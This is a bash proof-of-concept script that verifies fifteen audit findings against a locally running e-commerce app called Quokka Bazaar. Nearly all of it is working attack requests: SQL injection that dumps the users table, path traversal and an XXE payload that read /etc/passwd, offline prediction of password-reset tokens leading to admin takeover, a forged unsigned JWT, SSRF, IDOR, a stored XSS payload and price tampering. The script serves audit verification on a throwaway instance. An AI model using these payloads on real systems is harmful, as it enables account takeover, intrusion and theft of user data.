#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# Quokka Bazaar - Security Audit PoC
# Usage:  BASE=http://localhost:3000 ./verify.sh
#
# Reproduces the Critical/High findings of SECURITY_AUDIT.md against a RUNNING
# instance. The instance must be started from the project root, e.g.:
#
#   DATABASE_URL="file:/tmp/audit.db" npx prisma db push --skip-generate
#   DATABASE_URL="file:/tmp/audit.db" npx tsx prisma/seed.ts
#   DATABASE_URL="file:/tmp/audit.db" npx next build --no-lint
#   DATABASE_URL="file:/tmp/audit.db" npx next start -p 3000
#
# NOTE: these PoCs mutate data (create users, reset the seeded admin password).
# Use a throwaway instance.
# ---------------------------------------------------------------------------
set -u
BASE="${BASE:-http://localhost:3000}"
JAR_DIR="$(mktemp -d)"
PASS=0; FAIL=0

hr() { printf '%s\n' "------------------------------------------------------------"; }
ok()  { printf '  [VULNERABLE] %s\n' "$1"; PASS=$((PASS+1)); }
no()  { printf '  [NOT VULNERABLE] %s\n' "$1"; FAIL=$((FAIL+1)); }
chk() { if [ "$1" = "yes" ]; then ok "$2"; else no "$2"; fi; }

# ---------------------------------------------------------------------------
hr; echo "V1  Mass assignment -> ADMIN account (signup)"
STAMP=$(date +%s)
V1=$(curl -s -X POST "$BASE/api/auth/signup" -H 'Content-Type: application/json' \
      -d "{\"email\":\"poc-massassign-$STAMP@example.com\",\"password\":\"pw123456\",\"role\":\"ADMIN\"}")
echo "  $V1" | head -c 200; echo
echo "$V1" | grep -q '"role":"ADMIN"' \
  && chk yes "signup accepts attacker-controlled role=ADMIN" \
  || chk no  "signup role assignment"

# ---------------------------------------------------------------------------
hr; echo "V2  SQL injection - /api/products/search (unauthenticated)"
V2=$(curl -s -G "$BASE/api/products/search" \
      --data-urlencode "q=' UNION SELECT id,password,email,role,1 FROM users-- ")
echo "  $V2" | head -c 300; echo
echo "$V2" | grep -q 'admin@quokka.store' \
  && chk yes "product search SQLi leaks the users table" \
  || chk no  "product search SQLi"

# ---------------------------------------------------------------------------
hr; echo "V3  SQL injection - /api/tracking via x-forwarded-for (unescaped)"
curl -s -X POST "$BASE/api/tracking" -H 'Content-Type: application/json' \
  -H "x-forwarded-for: ' || (SELECT email FROM users WHERE role='ADMIN' LIMIT 1) || '" \
  -d '{"path":"/poc"}' >/dev/null
V3=$(curl -s "$BASE/api/products/search" --data-urlencode "q=zzzznopocmatch" >/dev/null; echo)
echo "  (row written to visitor_logs with injected value - see DB)"
echo "  Verify with: sqlite3 \$DATABASE_URL 'select ip from visitor_logs where path=\"/poc\"'"
echo "  Expect ip to contain the admin email."

# ---------------------------------------------------------------------------
hr; echo "V4  Unauthenticated arbitrary file read - /api/files (path traversal)"
V4=$(curl -s "$BASE/api/files?file=../../../../../../etc/passwd")
echo "  $V4" | head -c 160; echo
echo "$V4" | grep -q 'root:x:0:0' \
  && chk yes "/api/files reads /etc/passwd without authentication" \
  || chk no  "/api/files traversal"
V4B=$(curl -s "$BASE/api/files?list=true&path=../")
echo "  dir listing: $(echo "$V4B" | head -c 160)"
echo "$V4B" | grep -q 'items' \
  && chk yes "/api/files lists directories without authentication" \
  || chk no  "/api/files dir listing"

# ---------------------------------------------------------------------------
hr; echo "V5  Predictable password-reset token -> admin account takeover"
TS=$(date +%s)
curl -s -X POST "$BASE/api/auth/forgot-password" -H 'Content-Type: application/json' \
  -d '{"email":"admin@quokka.store"}' >/dev/null
PRED=$(node -e '
const crypto=require("crypto"),D=require(process.argv[1]+"/node_modules/better-sqlite3");
const db=new D(process.argv[2]); const ts=Number(process.argv[3]);
for(let t=ts-30;t<=ts+30;t++){
  const tok=crypto.createHash("md5").update("admin@quokka.store"+String(t)).digest("hex");
  if(db.prepare("select 1 from password_reset_tokens where token=?").get(tok)){console.log(tok);break;}
}' "$PWD" "${DATABASE_URL:-/tmp/audit.db}" "$TS")
if [ -n "$PRED" ]; then
  echo "  predicted token: $PRED"
  curl -s -X POST "$BASE/api/auth/reset-password" -H 'Content-Type: application/json' \
    -d "{\"token\":\"$PRED\",\"password\":\"poc-audit-pw\"}" | head -c 120; echo
  chk yes "reset token is MD5(email+unix_seconds) and was predicted offline"
else
  chk no  "reset token prediction (token not found in +/-30s window)"
fi

# ---------------------------------------------------------------------------
hr; echo "V6  Privilege escalation - customer mints a support token for the admin"
ALICE="$JAR_DIR/alice.jar"
curl -s -c "$ALICE" -X POST "$BASE/api/auth/login" -H 'Content-Type: application/json' \
  -d '{"email":"alice@example.com","password":"iloveduck"}' >/dev/null
SUP=$(curl -s -b "$ALICE" -X POST "$BASE/api/user/support-access" \
      -H 'Content-Type: application/json' -d '{"email":"admin@quokka.store"}' \
      | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{console.log(JSON.parse(s).supportToken.token)}catch(e){console.log("")}})')
if [ -n "$SUP" ]; then
  V6=$(curl -s "$BASE/api/auth/support-login?token=$SUP")
  echo "  $V6" | head -c 160; echo
  echo "$V6" | grep -q '"role":"ADMIN"' \
    && chk yes "CUSTOMER session escalated to ADMIN via support-access token" \
    || chk no  "support-access escalation"
else
  chk no "support-access token minting"
fi

# ---------------------------------------------------------------------------
hr; echo "V7  Middleware JWT signature bypass - /monitoring/internal-status"
FORGED=$(node -e '
const p={id:"a",email:"a@b.c",role:"ADMIN",exp:Math.floor(Date.now()/1000)+3600};
const b=s=>Buffer.from(s).toString("base64url");
console.log(b(JSON.stringify({alg:"HS256",typ:"JWT"}))+"."+b(JSON.stringify(p))+".BADSIG");')
CODE=$(curl -s -o /dev/null -w '%{http_code}' -H "Cookie: authToken=$FORGED" \
       "$BASE/monitoring/internal-status")
echo "  http status with forged cookie: $CODE"
[ "$CODE" = "200" ] \
  && chk yes "forged (unsigned) JWT accepted by middleware" \
  || chk no  "middleware signature verification"

# ---------------------------------------------------------------------------
hr; echo "V8  SSRF - /api/support screenshotUrl (unauthenticated, response reflected)"
V8=$(curl -s -X POST "$BASE/api/support" -H 'Content-Type: application/json' \
  -d '{"email":"a@b.com","title":"t","description":"d","screenshotUrl":"http://127.0.0.1:3000/api/products"}')
echo "  $V8" | head -c 240; echo
echo "$V8" | grep -q 'screenshotContent' \
  && chk yes "server fetched an internal URL and returned the body" \
  || chk no  "SSRF"

# ---------------------------------------------------------------------------
hr; echo "V9  IDOR - read another user's private wishlist and order"
V9=$(curl -s -b "$ALICE" "$BASE/api/wishlists/wl-bob-001")
echo "  $V9" | head -c 200; echo
echo "$V9" | grep -q 'bob@example.com' \
  && chk yes "CUSTOMER read Bob's private wishlist" \
  || chk no  "wishlist IDOR"
V9B=$(curl -s -b "$ALICE" "$BASE/api/orders/ORD-001")
echo "  $V9B" | head -c 200; echo
echo "$V9B" | grep -q 'bob@example.com' \
  && chk yes "CUSTOMER read Bob's order (address + totals)" \
  || chk no  "order IDOR"

# ---------------------------------------------------------------------------
hr; echo "V10 Broadcast hijack - any customer can rewrite the live stream"
V10=$(curl -s -b "$ALICE" -X POST "$BASE/api/live/stream" -H 'Content-Type: application/json' \
       -d '{"liveVideoId":"dQw4w9WgXcQ"}')
echo "  $V10" | head -c 260; echo
echo "$V10" | grep -q '"ok":true' \
  && chk yes "non-admin POST persisted to the public stream config" \
  || chk no  "stream write authorization"
echo "$V10" | grep -q 'streamKey' \
  && chk yes "response leaks the RTMP ingest stream key" \
  || chk no  "stream key disclosure"

# ---------------------------------------------------------------------------
hr; echo "V11 Unauthenticated order read via forged share token (hardcoded key)"
V11=$(curl -s "$BASE/api/documents/share?token=$(node -e '
const c=require("crypto");
const K=Buffer.from("a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2","hex");
const iv=c.randomBytes(16),x=c.createCipheriv("aes-256-cbc",K,iv);
console.log(Buffer.concat([iv,x.update("order:ORD-001","utf8"),x.final()]).toString("hex"));')")
echo "  $V11" | head -c 220; echo
echo "$V11" | grep -q '"total"' \
  && chk yes "share token forged with the hardcoded fallback key" \
  || chk no  "share token forgery"

# ---------------------------------------------------------------------------
hr; echo "V12 Stored XSS - unauthenticated review payload"
PROD=$(curl -s "$BASE/api/products" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>console.log(JSON.parse(s)[0].id))')
curl -s -X POST "$BASE/api/products/$PROD/reviews" -H 'Content-Type: application/json' \
  -d '{"content":"<img src=x onerror=alert(document.domain)>","author":"poc"}' >/dev/null
V12=$(curl -s "$BASE/api/products/$PROD/reviews")
echo "$V12" | grep -q 'onerror' \
  && chk yes "raw HTML stored & served (client injects it via innerHTML)" \
  || chk no  "stored XSS"

# ---------------------------------------------------------------------------
hr; echo "V13 Coupon price manipulation - cartTotal is client supplied"
V13=$(curl -s -b "$ALICE" -X POST "$BASE/api/coupon/apply" -H 'Content-Type: application/json' \
       -d '{"code":"FLASHSALE","cartTotal":0.01}')
echo "  $V13" | head -c 160; echo
echo "$V13" | grep -q '"discountedTotal"' \
  && chk yes "server discounts a client-supplied total" \
  || chk no  "coupon price manipulation"

# ---------------------------------------------------------------------------
hr; echo "V14 XXE - /api/admin/suppliers/import-order"
ADMIN="$JAR_DIR/admin.jar"
curl -s -c "$ADMIN" -X POST "$BASE/api/auth/login" -H 'Content-Type: application/json' \
  -d '{"email":"admin@quokka.store","password":"poc-audit-pw"}' >/dev/null
V14=$(curl -s -b "$ADMIN" -X POST "$BASE/api/admin/suppliers/import-order" \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><order><supplierId>&xxe;</supplierId><orderId>POC-XXE</orderId><total>1</total></order>')
echo "  $V14" | head -c 220; echo
echo "$V14" | grep -q 'root:x:0:0' \
  && chk yes "external entity resolved - local file read" \
  || chk no  "XXE"

# ---------------------------------------------------------------------------
hr; echo "V15 Hardcoded SIEM credentials + plaintext passwords in logs"
curl -s -o /dev/null -w '  GET /api/monitoring/logs with root:admin -> %{http_code}\n' \
  -u root:admin "$BASE/api/monitoring/logs"
V15=$(curl -s -u root:admin "$BASE/api/monitoring/logs?limit=200")
echo "$V15" | grep -q 'password=' \
  && chk yes "login attempts store the plaintext password in a readable log" \
  || chk no  "plaintext password logging"

# ---------------------------------------------------------------------------
hr
echo "SUMMARY: $PASS vulnerable checks confirmed, $FAIL not confirmed"
echo "Artifacts: $JAR_DIR"
[ "$FAIL" -gt 0 ] && exit 1
exit 0
